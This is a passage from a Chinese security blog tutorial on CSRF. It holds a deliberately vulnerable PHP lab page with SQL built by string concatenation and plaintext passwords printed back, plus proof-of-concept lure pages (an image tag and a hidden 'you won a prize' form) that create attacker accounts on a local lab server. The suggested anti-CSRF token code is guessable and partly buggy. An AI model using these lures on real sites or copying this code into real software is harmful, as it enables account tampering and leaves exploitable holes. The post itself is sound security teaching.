@@ -1,0 +1,611 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>CSRF学习 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CSRF学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-24 19:57" pubdate>
+        2020年3月24日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CSRF学习</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月20日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="CSRF学习"><a href="#CSRF学习" class="headerlink" title="CSRF学习"></a>CSRF学习</h1><p>CSRF：跨站请求伪造，利用目标用户的合法身份，以目标用户的名义执行某些非法操作</p>
+<p>前提：目标必须处于登录状态</p>
+<p>XSS与CSRF的区别：</p>
+<p>1.XSS利用站点内信任的用户，盗取cookie</p>
+<p>2.CSRF通过伪装受信任用户请求受信任的网站</p>
+<h3 id="1-无防护的CSRF漏洞利用"><a href="#1-无防护的CSRF漏洞利用" class="headerlink" title="1.无防护的CSRF漏洞利用"></a>1.无防护的CSRF漏洞利用</h3><h4 id="1-GET型无防护CSRF漏洞代码分析"><a href="#1-GET型无防护CSRF漏洞代码分析" class="headerlink" title="1.GET型无防护CSRF漏洞代码分析"></a>1.GET型无防护CSRF漏洞代码分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,test);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接错误: &quot;</span> . mysqli_connect_error());<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>!=<span class="hljs-literal">null</span>)&#123;<br>        mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;set names &#x27;utf-8&quot;</span>);<br>        <span class="hljs-variable">$sql0</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$row0</span> = mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql0</span>);<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row0s</span> = mysqli_fetch_array(<span class="hljs-variable">$row0</span>))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row0s</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>)&#123;<br>                <span class="hljs-variable">$flag</span> = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$flag</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;已存在&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `users` values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>            <span class="hljs-variable">$row</span> = mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span> . <span class="hljs-string">&quot;数据添加成功&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;select * from users&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row1</span> = mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>))&#123;<br>            <span class="hljs-keyword">while</span>(<span class="hljs-variable">$rows</span> = mysqli_fetch_array(<span class="hljs-variable">$row1</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user:<span class="hljs-subst">&#123;$rows[&#x27;username&#x27;]&#125;</span>----pass:<span class="hljs-subst">&#123;$rows[&#x27;password&#x27;]&#125;</span>&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;get-csrf测试&lt;/title&gt;<br>    &lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>        .main&#123;<br>    margin: <span class="hljs-number">0</span> auto;<br>            padding: <span class="hljs-number">10</span>px;<br>            width: <span class="hljs-number">250</span>px;<br>            height: <span class="hljs-number">200</span>px;<br>            background: cornflowerblue;<br>        &#125;<br>        .leftbar&#123;<br>    width: <span class="hljs-number">30</span>%;<br>    padding-bottom: <span class="hljs-number">15</span>px;<br>            display: inline-block;<br>            text-align: right;<br>        &#125;<br>        .bottom&#123;<br>    padding-bottom: <span class="hljs-number">15</span>px;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;b&gt;&lt;h2&gt;GET型 csrf&lt;/h2&gt;&lt;/b&gt;<br>&lt;p&gt;需要用GET方法提交username,password两个参数&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<h4 id="2-GET型CSRF漏洞利用"><a href="#2-GET型CSRF漏洞利用" class="headerlink" title="2.GET型CSRF漏洞利用"></a>2.GET型CSRF漏洞利用</h4><p>构造一个恶意的页面，诱惑目标访问，导致创建新的账号和密码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>来啊！拿奖金<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/get-csrf.php?username=hacker&amp;password=hacker&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="3-POST型CSRF代码利用"><a href="#3-POST型CSRF代码利用" class="headerlink" title="3.POST型CSRF代码利用"></a>3.POST型CSRF代码利用</h4><p><strong>1.POST型CSRF代码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$con</span> = mysqli_connect(localhost,root,root,test);<br>    mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;set names utf-8&quot;</span>);<br>    <span class="hljs-variable">$flag</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_array(mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql</span>)))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>)&#123;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;已存在&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql1</span> = <span class="hljs-string">&quot;insert into `users` values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$password</span>&#x27;)&quot;</span>;<br>        <span class="hljs-variable">$row1</span> = mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;插入成功&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;插入失败&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable">$sql2</span> = <span class="hljs-string">&quot;select * from users&quot;</span>;<br>        <span class="hljs-variable">$row2</span> = mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-variable">$sql2</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row2s</span> = mysqli_fetch_array(<span class="hljs-variable">$row2</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;user:<span class="hljs-subst">&#123;$row2s[&#x27;username&#x27;]&#125;</span>-----pass:<span class="hljs-subst">&#123;$row2s[&#x27;password&#x27;]&#125;</span>&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;title&gt;POST型CSRF漏洞学习&lt;/title&gt;<br>&lt;head&gt;<br>    欢迎来到reader自创靶场<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p&gt;请用POST方法提交username和password两个参数&lt;/p&gt;<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;p&gt; 用户名:&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> /&gt;&lt;/p&gt;<br>    &lt;p&gt; 密码:&lt;input type=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span>&gt;&lt;/p&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><br><br></code></pre></td></tr></table></figure>
+<p><strong>2.POST型CSRF利用</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>抽奖中心<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/post-csrf.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker2&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hacker2&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;你中奖啦！&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="2-CSRF自动化探测"><a href="#2-CSRF自动化探测" class="headerlink" title="2.CSRF自动化探测"></a>2.CSRF自动化探测</h2><p>手动探测原理：在于探测web应用程序具有防止CSRF的措施</p>
+<p>CSRF漏洞预防措施：</p>
+<p>1.一般情况下使用js验证，但是是否执行成功取决于用户，不建议使用</p>
+<p>2.HTTP Referer头</p>
+<p>3.是否设置token</p>
+<p>4.HTTP自定义头</p>
+<p>如果web应用程序的HTTP请求中没有对应的措施，那么很大程度上就确定了存在CSRF漏洞</p>
+<p>自动化探测工具CSRFTester</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">下载地址：https:<span class="hljs-regexp">//</span>www.owasp.org<span class="hljs-regexp">/index.php/</span>File:CSRFTester-<span class="hljs-number">1.0</span>.zip<br></code></pre></td></tr></table></figure>
+<p>使用方法：</p>
+<p>1.设置游览器代理：127.0.0.1:8008</p>
+<p>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改了则表名存在CSRF漏洞</p>
+<p>3.生产poc代码</p>
+<p><img src="/2020/03/24/CSRF%E5%AD%A6%E4%B9%A0/1.png" srcset="/img/loading.gif" alt="1"></p>
+<h3 id="3-csrf漏洞防御"><a href="#3-csrf漏洞防御" class="headerlink" title="3.csrf漏洞防御"></a>3.csrf漏洞防御</h3><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作</p>
+<p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作。不正确不执行操作。</p>
+<p>一般情况下，给予的令牌会写入表单中隐藏域的valus值中，随着表单内容进行提交</p>
+<p>远程构造CSRF利用poc，那么直接中招。如果利用在增删改查中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作，。并给出提示</p>
+<p><strong>生成token代码(最好是不容易猜解)</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span> <span class="hljs-title">Token</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$salt</span> = <span class="hljs-string">&quot;asdasd2qwe13&quot;</span>.date(<span class="hljs-string">&quot;h/i/s&quot;</span>);<br>    <span class="hljs-variable">$token</span> = md5(<span class="hljs-variable">$salt</span>);<br>    <span class="hljs-keyword">return</span> token;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>使用token进行CSRF漏洞防御</strong></p>
+<p>1、登录验证成功之后，在会话session[‘user_token’]中保存token</p>
+<p>2、在后台操作中，增删改查表单中添加隐藏域hidden，设置value为token</p>
+<p>3、提交之后进行验证token是否正确</p>
+<p>结合以上的知识点，我编写了利用token防御CSRF的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">generateToken.php,这个是我们访问的插入用户名和密码的页面<br><span class="hljs-meta">&lt;?php</span><br>    session_start();<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate_Token</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$salt</span> = <span class="hljs-string">&quot;tasdasdsadsaq&quot;</span>.date(<span class="hljs-string">&quot;h/i/s&quot;</span>);<br>        <span class="hljs-variable">$token</span> = md5(<span class="hljs-variable">$salt</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$token</span>;<br>    &#125;<br>    <span class="hljs-variable">$token</span> = generate_Token();<br><span class="hljs-comment">//    echo $token;</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_token&#x27;</span>] = <span class="hljs-variable">$token</span>;<br><span class="hljs-meta">?&gt;</span><br>    <br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;title&gt;POST型CSRF漏洞学习&lt;/title&gt;<br>&lt;head&gt;<br>    